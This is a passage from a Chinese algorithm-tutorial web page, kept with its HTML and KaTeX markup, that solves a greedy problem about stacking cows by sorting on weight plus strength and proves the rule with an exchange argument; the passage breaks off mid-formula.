class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">10 3</span><br><span class="line">2 5</span><br><span class="line">3 3</span><br></pre></td></tr></table></figure><p><strong>输出样例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure><h3 id="贪心-8">贪心</h3><p><strong>做法</strong> <strong>按照<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mi>i</mi></msub><mo>+</mo><msub><mi>s</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">w_i+s_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>从小到大排序，最大的危险系数一定是最小的。</strong></p><blockquote><p>思路：这TM谁能想到？（<br>每头牛的危险值 = 它上面牛的重量和 - 自身的强壮值<br>要使得某头牛的危险值最小，显然与w和s都有关……然后就靠猜了</p></blockquote><p><strong>证明</strong> 采用调整法</p><p>若不按照上述方法，一定会存在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mi>i</mi></msub><mo>+</mo><msub><mi>s</mi><mi>i</mi></msub><mo>&gt;</mo><msub><mi>w</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>+</mo><msub><mi>s</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">w_i+s_i &gt; w_{i+1} + s_{i+ 1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6891em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span></p><p>关注这i和(i+1)层交换前后牛的危险系数（其他位置不受影响）：</p><table><thead><tr><th></th><th>第i位置的牛</th><th>第i+1位置的牛</th></tr></thead><tbody><tr><td>交换前</td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msubsup><msub><mi>w</mi><mi>j</mi></msub><mo>−</mo><msub><mi>s</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\sum_{j=1}^{i-1}w_j-s_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4004em;vertical-align:-0.4358em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9646em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msubsup><msub><mi>w</mi><mi>j</mi></msub><mo>+</mo><msub><mi>w</mi><mi>i</mi></msub><mo>−</mo><msub><mi>s</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">\sum_{j=1}^{i-1}w_j+w_i-s_{i+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4004em;vertical-align:-0.4358em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9646em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span></td></tr><tr><td>交换后</td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msubsup><msub><mi>w</mi><mi>j</mi></msub><mo>−</mo><msub><mi>s</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">\sum_{j=1}^{i-1}w_j-s_{i+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4004em;vertical-align:-0.4358em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9646em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msubsup><msub><mi>w</mi><mi>j</mi></msub><mo>+</mo><msub><mi>w</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>−</mo><msub><mi>s</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\sum_{j=1}^{i-1}w_j+w_{i+1}-s_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4004em;vertical-align:-0.4358em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9646em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td></tr></tbody></table><p>每个式子将去<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msubsup><msub><mi>w</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\sum_{j=1}^{i-1}w_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4004em;vertical-align:-0.4358em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9646em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>后，再加上<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mi>i</mi></msub><mo>+</mo><msub><mi>s</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">s_i+s_{i+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span>得到：</p><table><thead><tr><th></th><th>第i位置的牛</th><th>第i+1位置的牛</th></tr></thead><tbody><tr><td>交换前</td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">s_{i+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mi>i</mi></msub><mo>+</mo><msub><mi>s</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">w_i+s_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td></tr><tr><td>交换后</td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">s_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>+</mo><msub><mi>s</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">w_{i+1}+s_{i+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span></td></tr></tbody></table><p>由于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mi>i</mi></msub><mo>+</mo><msub><mi>s</mi><mi>i</mi></msub><mo>&gt;</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><msub><mi>s</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>w</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>+</mo><msub><mi>s</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">w_i+s_i &gt; max(s_i, w_{i+1}+s_{i+1})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6891em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord"><span class="mord 